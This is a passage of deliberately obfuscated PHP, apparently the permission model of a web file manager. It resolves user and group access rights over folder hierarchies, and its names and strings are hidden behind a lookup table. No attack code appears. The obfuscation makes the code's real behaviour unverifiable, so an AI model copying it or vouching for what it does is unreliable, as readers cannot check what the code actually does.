Ç[2330] => $¤úÙñ Ç[2331], $¤úÙñ Ç[2332] => LNG($¤úÙñ Ç[2333]), $¤úÙñ Ç[2310] => array_field_key($ì•ìÆÓ, $Í†ñÍ¶), $¤úÙñ Ç[499] => $Ğãşé¹’, $¤úÙñ Ç[500] => $Ğãşé¹’[$¤úÙñ Ç[499]], $¤úÙñ Ç[2334] => $ú»®Š¾Ú); } } $GLOBALS[$¤úÙñ Ç[7]][$¤úÙñ Ç[430]] = $äµµ÷Ğ¹[$¤úÙñ Ç[430]]; $GLOBALS[$¤úÙñ Ç[7]][$¤úÙñ Ç[441]] = $äµµ÷Ğ¹[$¤úÙñ Ç[441]]; foreach ($½ŠõŒòÈ as $ÕŒÔ´ä™ => $ÕŒ›ï»ˆ) { if (!$ÕŒ›ï»ˆ) { continue; } foreach ($ÕŒ›ï»ˆ as $Ä‚ÅèÒ) { if (!$Ä‚ÅèÒ || !$Ä‚ÅèÒ[$¤úÙñ Ç[586]] || $Ä‚ÅèÒ[$¤úÙñ Ç[586]] == $¤úÙñ Ç[230]) { continue; } if ($Ä‚ÅèÒ[$¤úÙñ Ç[190]] != SourceModel::TYPE_USER) { continue; } $›­›äÊ« = $Ä‚ÅèÒ[$¤úÙñ Ç[586]] . $¤úÙñ Ç[12]; if (isset($ÙÒôµŠœ[$›­›äÊ«])) { continue; } $Ï‡¤‡… = $this->authMake($ÕŒ›ï»ˆ, $›­›äÊ«); if (!$Ï‡¤‡… || !$Ï‡¤‡…[$¤úÙñ Ç[2332]]) { continue; } $ÙÒôµŠœ[$›­›äÊ«] = array($¤úÙñ Ç[2330] => $¤úÙñ Ç[2335], $¤úÙñ Ç[2332] => $Ï‡¤‡…[$¤úÙñ Ç[2332]], $¤úÙñ Ç[2310] => Model($¤úÙñ Ç[614])->getInfoSimpleOuter($›­›äÊ«), $¤úÙñ Ç[499] => $Ï‡¤‡…[$¤úÙñ Ç[553]], $¤úÙñ Ç[500] => $Ï‡¤‡…[$¤úÙñ Ç[553]][$¤úÙñ Ç[499]], $¤úÙñ Ç[2334] => $Ï‡¤‡…[$¤úÙñ Ç[2336]]); } } foreach ($½ŠõŒòÈ as $ÕŒÔ´ä™ => $ÕŒ›ï»ˆ) { if (!$ÕŒ›ï»ˆ) { continue; } foreach ($ÙÒôµŠœ as $›­›äÊ« => $ÖÆÌ¦ó) { if ($ÖÆÌ¦ó[$¤úÙñ Ç[2310]][$¤úÙñ Ç[1895]] || $ÖÆÌ¦ó[$¤úÙñ Ç[2330]] == $¤úÙñ Ç[2335]) { continue; } $Ï‡¤‡… = $this->authMake($ÕŒ›ï»ˆ, $›­›äÊ«); if (!$Ï‡¤‡… || !$Ï‡¤‡…[$¤úÙñ Ç[2332]]) { continue; } $ÙÒôµŠœ[$›­›äÊ«] = array($¤úÙñ Ç[2330] => $¤úÙñ Ç[2335], $¤úÙñ Ç[2332] => $Ï‡¤‡…[$¤úÙñ Ç[2332]], $¤úÙñ Ç[2310] => $ÖÆÌ¦ó[$¤úÙñ Ç[2310]], $¤úÙñ Ç[499] => $Ï‡¤‡…[$¤úÙñ Ç[553]], $¤úÙñ Ç[500] => $Ï‡¤‡…[$¤úÙñ Ç[553]][$¤úÙñ Ç[499]], $¤úÙñ Ç[2334] => $Ï‡¤‡…[$¤úÙñ Ç[2336]]); } } $ÙÒôµŠœ = array_sort_by($ÙÒôµŠœ, $¤úÙñ Ç[500], $¤úÙñ Ç[537]); return $ÙÒôµŠœ; } public function getAllChildren($¬—éä’ù) { $¸àõ²ó =& $_SERVER[±Ö‰ô½¯]; $Ôù±å¾¾ = Model($¸àõ²ó[1482])->sourceInfo($¬—éä’ù); if ($Ôù±å¾¾[$¸àõ²ó[497]] != $¸àõ²ó[91]) { return $this->sourceListAuth(array($¬—éä’ù)); } if ($Ôù±å¾¾[$¸àõ²ó[190]] != SourceModel::TYPE_GROUP) { return array(); } $„õ÷¨ñÈ = 1; $Ù¦Ê–“… = array($¬—éä’ù); if ($Ôù±å¾¾[$¸àõ²ó[192]] == $¸àõ²ó[230] && $Ôù±å¾¾[$¸àõ²ó[586]] != $„õ÷¨ñÈ) { $Ù¦Ê–“… = $this->groupChidldAllRootSource($Ôù±å¾¾[$¸àõ²ó[586]]); } $ˆ•š¹‡õ = $this->field($¸àõ²ó[193])->group($¸àõ²ó[193])->select(); $ˆ•š¹‡õ = array_to_keyvalue($ˆ•š¹‡õ, $¸àõ²ó[12], $¸àõ²ó[193]); if (!$ˆ•š¹‡õ) { return array(); } $¬Ğ÷†‘ = $¸àõ²ó[2337]; $òäÂËÂ = array($¸àõ²ó[193] => array($¸àõ²ó[7], $ˆ•š¹‡õ), $¸àõ²ó[517] => $¸àõ²ó[230]); $šËòšĞ = Model($¸àõ²ó[930])->field($¬Ğ÷†‘)->where($òäÂËÂ)->select(); $·À§òôÃ = array($¬—éä’ù); foreach ($šËòšĞ as $œû”å¹‡) { foreach ($Ù¦Ê–“… as $á§ş²Õ) { $úëÌ­‡ã = $¸àõ²ó[50] . $á§ş²Õ . $¸àõ²ó[50]; $äóËóŒş = $œû”å¹‡[$¸àõ²ó[601]] . $œû”å¹‡[$¸àõ²ó[193]] . $¸àõ²ó[50]; if (strstr($äóËóŒş, $úëÌ­‡ã)) { $·À§òôÃ[] = $œû”å¹‡[$¸àõ²ó[193]]; break; } } } return $this->sourceListAuth($·À§òôÃ); } private function sourceListAuth($ÙÂ…Œ‡à) { $¾Ââü¯‚ =& $_SERVER[±Ö‰ô½¯]; $²ÕéØëÇ = Model($¾Ââü¯‚[1482])->sourceListInfo($ÙÂ…Œ‡à, !0); $ÒŸìüÊ» = $this->sourceAuthSelect($ÙÂ…Œ‡à); $ƒÄ¬°±Í = array(); $œÎğ±ğî = array(); foreach ($²ÕéØëÇ as $àö êé) { unset($àö êé[$¾Ââü¯‚[540]]); unset($àö êé[$¾Ââü¯‚[538]]); unset($àö êé[$¾Ââü¯‚[499]]); unset($àö êé[$¾Ââü¯‚[90]]); $©—¯¯×ˆ = $ÒŸìüÊ»[$àö êé[$¾Ââü¯‚[193]]]; if (!$©—¯¯×ˆ) { continue; } $àö êé[$¾Ââü¯‚[2334]] = $this->authTargetInfo($©—¯¯×ˆ); $àö êé[$¾Ââü¯‚[599]] = rtrim($àö êé[$¾Ââü¯‚[605]], $¾Ââü¯‚[8]) . $¾Ââü¯‚[8] . ltrim($àö êé[$¾Ââü¯‚[599]], $¾Ââü¯‚[8]); $ƒÄ¬°±Í[] = $àö êé; $İìİ×©â = count(explode($¾Ââü¯‚[8], trim($àö êé[$¾Ââü¯‚[599]], $¾Ââü¯‚[8]))); $œÎğ±ğî[] = $İìİ×©â + ($àö êé[$¾Ââü¯‚[33]] == $¾Ââü¯‚[78] ? 0 : 1000); } array_multisort($œÎğ±ğî, SORT_ASC, $ƒÄ¬°±Í); return $ƒÄ¬°±Í; } private function groupChidldAllRootSource($Ï³º°µ¶) { $à£„ŞÙ =& $_SERVER[±Ö‰ô½¯]; $èîíÜ•ˆ = Model($à£„ŞÙ[1442])->groupChildrenAll($Ï³º°µ¶); $–Š÷Ïó = array($à£„ŞÙ[192] => 0, $à£„ŞÙ[586] => array($à£„ŞÙ[7], $èîíÜ•ˆ), $à£„ŞÙ[190] => SourceModel::TYPE_GROUP); $Ö¦çàİÈ = Model($à£„ŞÙ[930])->field($à£„ŞÙ[193])->where($–Š÷Ïó)->select(); $Ö¦çàİÈ = array_to_keyvalue($Ö¦çàİÈ, $à£„ŞÙ[12], $à£„ŞÙ[193]); return $Ö¦çàİÈ; } private function authTargetInfo($í¸çÜ¼Î) { $ë—¯’…µ =& $_SERVER[±Ö‰ô½¯]; $ûÑÙçşÁ = array(); $ââá“ú¢ = array(); $Àâ²‘áÔ = 2 << 25; foreach ($í¸çÜ¼Î as $™¤‚°) { $óİ¦¦»™ = Model($ë—¯’…µ[588])->listData($™¤‚°[$ë—¯’…µ[1589]]); if (!$óİ¦¦»™) { continue; } if ($™¤‚°[$ë—¯’…µ[190]] == SourceModel::TYPE_USER) { $¼ßÛÛ«ø = Model($ë—¯’…µ[594])->getInfoSimpleOuter($™¤‚°[$ë—¯’…µ[586]]); if ($¼ßÛÛ«ø[$ë—¯’…µ[1542]] == $ë—¯’…µ[1326]) { continue; } if ($¼ßÛÛ«ø[$ë—¯’…µ[1542]] == $ë—¯’…µ[230]) { $¼ßÛÛ«ø[$ë—¯’…µ[32]] = LNG($ë—¯’…µ[2338]); } } else { $¼ßÛÛ«ø = Model($ë—¯’…µ[602])->getInfoSimple($™¤‚°[$ë—¯’…µ[586]]); } if (!$¼ßÛÛ«ø) { continue; } $¼ßÛÛ«ø[$ë—¯’…µ[553]] = $óİ¦¦»™; $ûÑÙçşÁ[] = $¼ßÛÛ«ø; $Õ£¥á¤± = 0; if ($™¤‚°[$ë—¯’…µ[190]] == SourceModel::TYPE_GROUP) { $Õ£¥á¤± = $Àâ²‘áÔ * 2; } if ($™¤‚°[$ë—¯’…µ[190]] == SourceModel::TYPE_USER) { $Õ£¥á¤± = $Àâ²‘áÔ; } if ($™¤‚°[$ë—¯’…µ[190]] == SourceModel::TYPE_USER && $™¤‚°[$ë—¯’…µ[586]] == $ë—¯’…µ[230]) { $Õ£¥á¤± = 0; } $ââá“ú¢[] = $óİ¦¦»™[$ë—¯’…µ[499]] + $Õ£¥á¤±; } array_multisort($ââá“ú¢, SORT_DESC, $ûÑÙçşÁ); return $ûÑÙçşÁ; } public function getAllChildrenByUser($ÀĞí½ˆä, $‡±–ˆ¤à) { $õğÇîßÖ =& $_SERVER[±Ö‰ô½¯]; $ïÙ¾Å° = Model($õğÇîßÖ[614])->getInfo($‡±–ˆ¤à); if (!$‡±–ˆ¤à || !$ÀĞí½ˆä || !$ïÙ¾Å°) { return array(); } $—èëñ… = Model($õğÇîßÖ[1482])->sourceInfo($ÀĞí½ˆä); $Ş…½·öò = array(); $½‡ğá¯ = 1; if ($—èëñ…[$õğÇîßÖ[192]] == $õğÇîßÖ[230] && $—èëñ…[$õğÇîßÖ[586]] != $½‡ğá¯ && $this->groupContainUser($—èëñ…[$õğÇîßÖ[586]], $‡±–ˆ¤à)) { foreach ($ïÙ¾Å°[$õğÇîßÖ[1443]] as $ø–Ö¦âÈ) { $ˆ¬±¥¹¹ = Model($õğÇîßÖ[602])->getInfo($ø–Ö¦âÈ[$õğÇîßÖ[1444]]); $¬‡•ğ…† = Model($õğÇîßÖ[614])->getInfoSimpleOuter($‡±–ˆ¤à); $¬‡•ğ…†[$õğÇîßÖ[553]] = $ø–Ö¦âÈ[$õğÇîßÖ[499]]; if (Model($õğÇîßÖ[588])->authCheckAction($ø–Ö¦âÈ[$õğÇîßÖ[499]][$õğÇîßÖ[499]], $õğÇîßÖ[1514])) { continue; } $ƒ»ÊâŠ = array($õğÇîßÖ[32] => $õğÇîßÖ[1345] . $ˆ¬±¥¹¹[$õğÇîßÖ[32]], $õğÇîßÖ[193] => $ˆ¬±¥¹¹[$õğÇîßÖ[90]][$õğÇîßÖ[193]], $õğÇîßÖ[87] => KodIO::make($ˆ¬±¥¹¹[$õğÇîßÖ[90]][$õğÇîßÖ[193]]), $õğÇîßÖ[192] => $õğÇîßÖ[230], $õğÇîßÖ[190] => $õğÇîßÖ[595], $õğÇîßÖ[33] => $õğÇîßÖ[636], $õğÇîßÖ[599] => $ˆ¬±¥¹¹[$õğÇîßÖ[606]], $õğÇîßÖ[1444] => $ˆ¬±¥¹¹[$õğÇîßÖ[1444]], $õğÇîßÖ[603] => $ˆ¬±¥¹¹[$õğÇîßÖ[192]], $õğÇîßÖ[2334] => array($¬‡•ğ…†)); $Ş…½·öò[$ƒ»ÊâŠ[$õğÇîßÖ[193]]] = $ƒ»ÊâŠ; } } $ãê×½É¤ = array(); $”—Ğì = $this->getAllChildren($ÀĞí½ˆä); foreach ($”—Ğì as $ÛèĞÑ¸) { $â“ñ•ö = !1; foreach ($ÛèĞÑ¸[$õğÇîßÖ[2334]] as $ËøÚÓ˜Û) { if ($ËøÚÓ˜Û[$õğÇîßÖ[1542]]) { if ($ËøÚÓ˜Û[$õğÇîßÖ[1542]] == $‡±–ˆ¤à) { $â“ñ•ö = !0; break; } } if ($ËøÚÓ˜Û[$õğÇîßÖ[1444]]) { if ($this->groupContainUser($ËøÚÓ˜Û[$õğÇîßÖ[1444]], $‡±–ˆ¤à)) { $â“ñ•ö = !0; break; } } } if ($â“ñ•ö) { $ãê×½É¤[] = $ÛèĞÑ¸; } $ÇùºèÓ = $ÛèĞÑ¸[$õğÇîßÖ[193]]; if (isset($Ş…½·öò[$ÇùºèÓ])) { $ÛèĞÑ¸[$õğÇîßÖ[2334]][] = $Ş…½·öò[$ÇùºèÓ][0]; $Ş…½·öò[$ÇùºèÓ] = !1; } } $Ş…½·öò = array_filter(array_values($Ş…½·öò)); $ãê×½É¤ = array_merge($Ş…½·öò, $ãê×½É¤); return $ãê×½É¤; } public function setAllChildrenByUser($ò©¹–Å¾, $ç¢Ü¤ÙÁ, $âÕÊµ‘Ú) { $Í¯¶„€ =& $_SERVER[±Ö‰ô½¯]; $¸×ãĞäƒ = $this->getAllChildrenByUser($ò©¹–Å¾, $ç¢Ü¤ÙÁ); if (!$âÕÊµ‘Ú || !$¸×ãĞäƒ) { return !1; } foreach ($¸×ãĞäƒ as $¸îæØÛà) { $“éğÕôı = array(); foreach ($¸îæØÛà[$Í¯¶„€[2334]] as $‘ñÙ´½¨) { $™µœÁø¸ = $‘ñÙ´½¨[$Í¯¶„€[553]]; $ÂœÏ×È = $‘ñÙ´½¨[$Í¯¶„€[1542]] ? SourceModel::TYPE_USER : SourceModel::TYPE_GROUP; $ƒ¾´ª·Í = $‘ñÙ´½¨[$Í¯¶„€[1542]] ? $‘ñÙ´½¨[$Í¯¶„€[1542]] : $‘ñÙ´½¨[$Í¯¶„€[1444]]; if ($‘ñÙ´½¨[$Í¯¶„€[1542]] && $‘ñÙ´½¨[$Í¯¶„€[1542]] == $ç¢Ü¤ÙÁ) { continue; } $“éğÕôı[] = array($Í¯¶„€[193] => $¸îæØÛà[$Í¯¶„€[193]], $Í¯¶„€[190] => $ÂœÏ×È, $Í¯¶„€[586] => intval($ƒ¾´ª·Í), $Í¯¶„€[1589] => isset($™µœÁø¸[$Í¯¶„€[484]]) ? intval($™µœÁø¸[$Í¯¶„€[484]]) : 0, $Í¯¶„€[2298] => isset($™µœÁø¸[$Í¯¶„€[2298]]) ? intval($™µœÁø¸[$Í¯¶„€[2298]]) : -1); } $“éğÕôı[] = array($Í¯¶„€[193] => $¸îæØÛà[$Í¯¶„€[193]], $Í¯¶„€[190] => SourceModel::TYPE_USER, $Í¯¶„€[586] => intval($ç¢Ü¤ÙÁ), $Í¯¶„€[1589] => intval($âÕÊµ‘Ú), $Í¯¶„€[2298] => -1); $this->where(array($Í¯¶„€[503] => $¸îæØÛà[$Í¯¶„€[193]]))->delete(); $this->addAll($“éğÕôı); } return !0; } public function get($ìÈ´÷‘) { $¬®Ï®Áˆ = $this->getSourceList(array($ìÈ´÷‘), !0); return $¬®Ï®Áˆ[0]; } public function getSourceList($šØí¿Ú­, $È—İ¤ªù = false, $Ì¥î¾ï÷ = false) { $ÙÌ¸Ôƒş =& $_SERVER[±Ö‰ô½¯]; if (!$šØí¿Ú­) { return array(); } $ÔÄù›š¹ = Model($ÙÌ¸Ôƒş[1482]); if (!$È—İ¤ªù && count($šØí¿Ú­) == 1) { $È—İ¤ªù = array(); $È—İ¤ªù[$šØí¿Ú­[0]] = $ÔÄù›š¹->sourceInfo($šØí¿Ú­[0]); } if (!$È—İ¤ªù) { $ÑêëÄ‹Ö = array($ÙÌ¸Ôƒş[503] => array($ÙÌ¸Ôƒş[504], $šØí¿Ú­)); $È—İ¤ªù = $ÔÄù›š¹->field($ÙÌ¸Ôƒş[2339])->where($ÑêëÄ‹Ö)->select(); $È—İ¤ªù = array_to_keyvalue($È—İ¤ªù, $ÙÌ¸Ôƒş[193]); } $«‚Áº = $šØí¿Ú­; foreach ($È—İ¤ªù as $Á¦ğ‚’Î => $Œ§´Ü²) { $§—Ş‡š = $ÔÄù›š¹->parentLevelArray($Œ§´Ü²[$ÙÌ¸Ôƒş[601]]); $«‚Áº = array_merge($«‚Áº, array(intval($Á¦ğ‚’Î)), array_reverse($§—Ş‡š)); } $«‚Áº = array_values(array_unique($«‚Áº)); if (!$«‚Áº) { return array(); } $•ŒÑˆû› = $this->sourceAuthSelect($«‚Áº); $ã»ˆæ“Ç = array(); foreach ($«‚Áº as $ÊÇÖÕí) { if (isset($•ŒÑˆû›[$ÊÇÖÕí])) { $ã»ˆæ“Ç[$ÊÇÖÕí] = $•ŒÑˆû›[$ÊÇÖÕí]; } } $Ü¶€§ûÁ = $this->userIsRoot($Ì¥î¾ï÷); $‚Ãí‘õô = AuthModel::authAll(); $«û¯ö¤¤ = array($ÙÌ¸Ôƒş[500] => $‚Ãí‘õô, $ÙÌ¸Ôƒş[2340] => array($ÙÌ¸Ôƒş[505] => 0, $ÙÌ¸Ôƒş[2142] => $‚Ãí‘õô, $ÙÌ¸Ôƒş[506] => LNG($ÙÌ¸Ôƒş[2321]), $ÙÌ¸Ôƒş[2157] => $ÙÌ¸Ôƒş[2322])); $ìéåèº½ = array(); foreach ($È—İ¤ªù as $ÊÇÖÕí => $¿·ò÷¡¿) { if ($Ü¶€§ûÁ && $GLOBALS[$ÙÌ¸Ôƒş[6]][$ÙÌ¸Ôƒş[2155]]) { $ìéåèº½[$ÊÇÖÕí] = $«û¯ö¤¤; continue; } $ìéåèº½[$ÊÇÖÕí] = $this->makeSourceAuth($¿·ò÷¡¿, $ã»ˆæ“Ç, $Ì¥î¾ï÷); } return $ìéåèº½; } public function authDeepCheck($áº½Éºô, $Ú Â›Ãø = false) { $İ¯Ì„ =& $_SERVER[±Ö‰ô½¯]; $Ú Â›Ãø = $Ú Â›Ãø ? $Ú Â›Ãø : USER_ID; $¬ŠÀÓƒ = $this->makeAuthDeep($Ú Â›Ãø); if (!in_array($áº½Éºô, $¬ŠÀÓƒ[$İ¯Ì„[2341]])) { return !1; } $ãôµšğ = array(); foreach ($¬ŠÀÓƒ[$İ¯Ì„[2342]] as $Ğüşé¾Á => $è¢Ÿ­Â) { if (!in_array($áº½Éºô, $è¢Ÿ­Â)) { continue; } $ãôµšğ[] = $Ğüşé¾Á; } if (!$ãôµšğ) { return !1; } $º¡ÓÛö = $ãôµšğ ? $ãôµšğ[0] : $áº½Éºô; return array($İ¯Ì„[500] => -1, $İ¯Ì„[553] => array($İ¯Ì„[505] => $İ¯Ì„[1326], $İ¯Ì„[2142] => $İ¯Ì„[230], $İ¯Ì„[506] => LNG($İ¯Ì„[2343]), $İ¯Ì„[2157] => $İ¯Ì„[2344]), $İ¯Ì„[2332] => LNG($İ¯Ì„[2345]), $İ¯Ì„[2346] => $this->sourceAuthInfo($º¡ÓÛö)); } protected function makeAuthDeep($şšó©Î = false) { $¿éãöŠ¢ =& $_SERVER[±Ö‰ô½¯]; static $¤Êâ©¾Ê = array(); $şšó©Î = $şšó©Î ? $şšó©Î : USER_ID; if (isset($¤Êâ©¾Ê[$şšó©Î])) { return $¤Êâ©¾Ê[$şšó©Î]; } $Å§­ïå = Model($¿éãöŠ¢[2347])->listData(); $ÑÒğò°ß = array(); foreach ($Å§­ïå as $ŸÑáÒ“) { if ($ŸÑáÒ“[$¿éãöŠ¢[499]] == 0 && $ŸÑáÒ“[$¿éãöŠ¢[2156]] == $¿éãöŠ¢[91]) { $ÑÒğò°ß[] = $ŸÑáÒ“[$¿éãöŠ¢[484]]; } } $®ˆôªéĞ = $this->userGroupParents($şšó©Î); $ô¾‰Ä‹ = array($¿éãöŠ¢[190] => SourceModel::TYPE_USER, $¿éãöŠ¢[586] => $şšó©Î); if ($®ˆôªéĞ) { $ô¾‰Ä‹ = array(array($¿éãöŠ¢[190] => SourceModel::TYPE_USER, $¿éãöŠ¢[586] => $şšó©Î), array($¿éãöŠ¢[190] => SourceModel::TYPE_GROUP, $¿éãöŠ¢[586] => array($¿éãöŠ¢[504], $®ˆôªéĞ)), $¿éãöŠ¢[1116] => $¿éãöŠ¢[2236]); } $ŒÀÉªñ = $this->field($¿éãöŠ¢[2348])->where($ô¾‰Ä‹)->select(); $’Êí¬ú¥ = array(); $³…Şïï = array_to_keyvalue_group($ŒÀÉªñ, $¿éãöŠ¢[193]); foreach ($³…Şïï as $²šú•ğ© => $“–¡éÆ­) { $ºñ¿–¡¬ = $this->authArrayCheck($“–¡éÆ­, $şšó©Î); if ($ºñ¿–¡¬[$¿éãöŠ¢[500]] > 0) { $’Êí¬ú¥[] = $²šú•ğ© . $¿éãöŠ¢[12]; } } if ($®ˆôªéĞ) { $¥Ä÷ ë = Model($¿éãöŠ¢[602]); foreach ($®ˆôªéĞ as $í¥¶Ôéˆ) { $ °Õş­• = $¥Ä÷ ë->getInfo($í¥¶Ôéˆ); if (!$ °Õş­• || !is_array($ °Õş­•[$¿éãöŠ¢[90]])) { continue; } $’Êí¬ú¥[] = $ °Õş­•[$¿éãöŠ¢[90]][$¿éãöŠ¢[193]]; } } $›ÚˆãóÒ = array(); $Ôû¿€¬î = $®ˆôªéĞ; $Ÿ¸ÜÂŸÍ = Model($¿éãöŠ¢[1482]); $¥Ä÷ ë = Model($¿éãöŠ¢[602]); $¢²…ã®ë = array(); $Ÿı­Õøø = array(); $Üù»×® = array(); $¼È³¢×‹ = array(); if ($’Êí¬ú¥) { $Ï²éÓÔ = $Ÿ¸ÜÂŸÍ->where(array($¿éãöŠ¢[193] => array($¿éãöŠ¢[504], $’Êí¬ú¥)))->select(); foreach ($Ï²éÓÔ as $”Ô°İ¨¢) { if ($”Ô°İ¨¢[$¿éãöŠ¢[517]] == $¿éãöŠ¢[91]) { continue; } $’ˆÜà–¥ = $Ÿ¸ÜÂŸÍ->parentLevelArray($”Ô°İ¨¢[$¿éãöŠ¢[601]]); $›ÚˆãóÒ = array_merge($›ÚˆãóÒ, $’ˆÜà–¥); $Ôû¿€¬î[] = $”Ô°İ¨¢[$¿éãöŠ¢[586]]; $¢²…ã®ë[$”Ô°İ¨¢[$¿éãöŠ¢[193]]] = $’ˆÜà–¥; $Ÿı­Õøø[$”Ô°İ¨¢[$¿éãöŠ¢[193]]] = $”Ô°İ¨¢[$¿éãöŠ¢[586]]; } } $Ôû¿€¬î = array_values(array_unique($Ôû¿€¬î)); $ÓĞ¹‚ŸÁ = $Ôû¿€¬î; foreach ($ÓĞ¹‚ŸÁ as $í¥¶Ôéˆ) { $ °Õş­• = $¥Ä÷ ë->getInfo($í¥¶Ôéˆ); $’ˆÜà–¥ = $Ÿ¸ÜÂŸÍ->parentLevelArray($ °Õş­•[$¿éãöŠ¢[601]]); $Ôû¿€¬î = array_merge($Ôû¿€¬î, $’ˆÜà–¥); } $Ôû¿€¬î = array_values(array_unique($Ôû¿€¬î)); foreach ($Ôû¿€¬î as $í¥¶Ôéˆ) { $ °Õş­• = $¥Ä÷ ë->getInfo($í¥¶Ôéˆ); $›ÚˆãóÒ[] = $ °Õş­•[$¿éãöŠ¢[90]][$¿éãöŠ¢[193]]; $Üù»×®[$í¥¶Ôéˆ] = $ °Õş­•[$¿éãöŠ¢[90]][$¿éãöŠ¢[193]]; $¼È³¢×‹[$í¥¶Ôéˆ] = $Ÿ¸ÜÂŸÍ->parentLevelArray($ °Õş­•[$¿éãöŠ¢[601]]); } foreach ($¢²…ã®ë as $á¤ˆûªë => $Ä¶‘¨½é) { $÷÷Ã¼¦œ = $Ÿı­Õøø[$á¤ˆûªë]; if (!$÷÷Ã¼¦œ || !$Üù»×®[$÷÷Ã¼¦œ]) { continue; } $¶ëí˜éÁ = array(); foreach ($¼È³¢×‹[$÷÷Ã¼¦œ] as $í¥¶Ôéˆ) { $¶ëí˜éÁ[] = $Üù»×®[$í¥¶Ôéˆ]; } $¢²…ã®ë[$á¤ˆûªë] = array_merge($¶ëí˜éÁ, $Ä¶‘¨½é); } $›ÚˆãóÒ = array_values(array_unique($›ÚˆãóÒ)); $åÓ¯óÊœ = array($¿éãöŠ¢[2341] => $›ÚˆãóÒ, $¿éãöŠ¢[2342] => $¢²…ã®ë); $¤Êâ©¾Ê[$şšó©Î] = $åÓ¯óÊœ; return $åÓ¯óÊœ; } private function makeSourceAuth($¦æ¥„ƒâ, $ƒ¼¡á¯µ, $áô°×±— = false) { $ª©îñâù =& $_SERVER[±Ö‰ô½¯]; $“€Ç”éü = $ª©îñâù[91]; $èäšç¹´ = $¦æ¥„ƒâ[$ª©îñâù[586]]; $¾¨ÀÀÜ = $¦æ¥„ƒâ[$ª©îñâù[190]] == SourceModel::TYPE_GROUP; $Öú²Øú = $¾¨ÀÀÜ ? $this->groupRootAuth($èäšç¹´, $áô°×±—) : !1; if ($Öú²Øú && Model($ª©îñâù[588])->authCheckAction($Öú²Øú[$ª©îñâù[499]], $ª©îñâù[1514])) { return $this->groupAuthInfo($Öú²Øú, $èäšç¹´); } $æºâÎ•ó = Model($ª©îñâù[1482])->parentLevelArray($¦æ¥„ƒâ[$ª©îñâù[601]]); $æºâÎ•ó = array_merge(array($¦æ¥„ƒâ[$ª©îñâù[193]]), array_reverse($æºâÎ•ó)); $é°¶Á°À = !1; foreach ($æºâÎ•ó as $è†ôç€ı) { if (!isset($ƒ¼¡á¯µ[$è†ôç€ı])) { continue; } $€´ªã³– = $this->authMake($ƒ¼¡á¯µ[$è†ôç€ı], $áô°×±—); if ($€´ªã³–[$ª©îñâù[553]]) { $é°¶Á°À = $€´ªã³–; break; } } if (!$¾¨ÀÀÜ) { return $é°¶Á°À; } if (!$é°¶Á°À && $Öú²Øú) { $é°¶Á°À = $this->groupAuthInfo($Öú²Øú, $èäšç¹´); } if (!$é°¶Á°À) { $¦âşÈ¤± = Model($ª©îñâù[602])->getInfo($èäšç¹´); $ğØÑÕÉ = explode($ª©îñâù[50], trim($¦âşÈ¤±[$ª©îñâù[601]], $ª©îñâù[50])); $ğØÑÕÉ = array_reverse($ğØÑÕÉ); foreach ($ğØÑÕÉ as $ğæñ¿ë) { if ($ğæñ¿ë == $ª©îñâù[230] || $ğæñ¿ë == $“€Ç”éü) { continue; } $Áùìˆ¿ş = $this->groupRootAuth($ğæñ¿ë, $áô°×±—); if (!$Áùìˆ¿ş) { continue; } $é°¶Á°À = $this->groupAuthInfo($Áùìˆ¿ş, $ğæñ¿ë); break; } } if (!$é°¶Á°À || $é°¶Á°À[$ª©îñâù[500]] <= 0) { $¤€…ŞØì = $this->authDeepCheck($¦æ¥„ƒâ[$ª©îñâù[193]], $áô°×±—); if ($¤€…ŞØì) { $é°¶Á°À = $¤€…ŞØì; } } return $é°¶Á°À; } private function userIsRoot($¢ÀÃ¹¨« = false) { $µØ”ù†‰ =& $_SERVER[±Ö‰ô½¯]; if (!$¢ÀÃ¹¨« && KodUser::isRoot()) { return !0; } $ëØ›µù = Model($µØ”ù†‰[614])->getInfo($¢ÀÃ¹¨«); $êÑÅÉ = Model($µØ”ù†‰[2325])->listData($ëØ›µù[$µØ”ù†‰[2326]]); if ($êÑÅÉ && $êÑÅÉ[$µØ”ù†‰[592]][$µØ”ù†‰[2329]] == 1) { return !0; } return !1; } private function sourceAuthInfo($‚ËÖ„êÊ) { $–Ü¿¼à =& $_SERVER[±Ö‰ô½¯]; $Ò¢Š«Üï = Model($–Ü¿¼à[1482]); $‚´‘ø¢Ï = $Ò¢Š«Üï->sourceInfo($‚ËÖ„êÊ); if (!$‚´‘ø¢Ï) { return !1; } $Ò¢Š«Üï->groupPathDisplay($‚´‘ø¢Ï); $ÈôÂ³‡ª = array($‚´‘ø¢Ï); $ÈôÂ³‡ª = $Ò¢Š«Üï->_listAppendPath($ÈôÂ³‡ª, !1); $‚´‘ø¢Ï = $ÈôÂ³‡ª[0]; $¥­ûãÌé = $‚´‘ø¢Ï[$–Ü¿¼à[599]]; if (isset($‚´‘ø¢Ï[$–Ü¿¼à[607]])) { $˜å­º³¡ = explode($–Ü¿¼à[8], trim($‚´‘ø¢Ï[$–Ü¿¼à[599]], $–Ü¿¼à[8])); array_shift($˜å­º³¡); $¥­ûãÌé = $‚´‘ø¢Ï[$–Ü¿¼à[605]] . $–Ü¿¼à[2349] . implode($–Ü¿¼à[8], $˜å­º³¡); } return array($–Ü¿¼à[32] => $‚´‘ø¢Ï[$–Ü¿¼à[32]], $–Ü¿¼à[193] => $‚´‘ø¢Ï[$–Ü¿¼à[193]], $–Ü¿¼à[87] => KodIO::make($‚´‘ø¢Ï[$–Ü¿¼à[193]]), $–Ü¿¼à[599] => $¥­ûãÌé); } private function groupAuthInfo($‡¯³·„Ê, $¦Ş¦çÆĞ) { $‘˜ùÀÌĞ =& $_SERVER[±Ö‰ô½¯]; $Àçşôñ¾ = Model($‘˜ùÀÌĞ[602])->getInfo($¦Ş¦çÆĞ); return array($‘˜ùÀÌĞ[2350] => intval($‡¯³·„Ê[$‘˜ùÀÌĞ[499]]), $‘˜ùÀÌĞ[2340] => $‡¯³·„Ê, $‘˜ùÀÌĞ[2351] => LNG($‘˜ùÀÌĞ[2352]), $‘˜ùÀÌĞ[2346] => array($‘˜ùÀÌĞ[506] => $Àçşôñ¾[$‘˜ùÀÌĞ[32]], $‘˜ùÀÌĞ[87] => KodIO::make($Àçşôñ¾[$‘˜ùÀÌĞ[90]][$‘˜ùÀÌĞ[193]]), $‘˜ùÀÌĞ[2353] => $Àçşôñ¾[$‘˜ùÀÌĞ[606]])); } protected function groupRootAuth($ÌâëÉÕŞ, $¡èáØ = false) { $î©á¾Æ« =& $_SERVER[±Ö‰ô½¯]; $¡èáØ = $¡èáØ ? $¡èáØ : USER_ID; $ïÙªÄü = $¡èáØ . $î©á¾Æ«[2354] . 